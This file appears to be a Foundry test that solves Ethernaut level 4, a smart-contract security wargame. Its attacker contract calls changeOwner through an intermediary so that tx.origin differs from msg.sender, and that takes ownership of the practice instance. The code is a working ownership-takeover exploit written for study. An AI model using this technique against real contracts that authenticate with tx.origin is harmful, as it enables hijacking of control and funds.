pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
    ITelephone telephone;

    constructor(ITelephone _telephone) {
        telephone = _telephone;
    }

    function attack() external {
        telephone.changeOwner(msg.sender);
    }
}

contract Ethernaut04 is EthernautTest {
    constructor() EthernautTest(4) {}

    function solve() internal override(EthernautTest) {
        TelephoneAttacker attacker = new TelephoneAttacker(
            ITelephone(instance)
        );
        attacker.attack();
    }
}
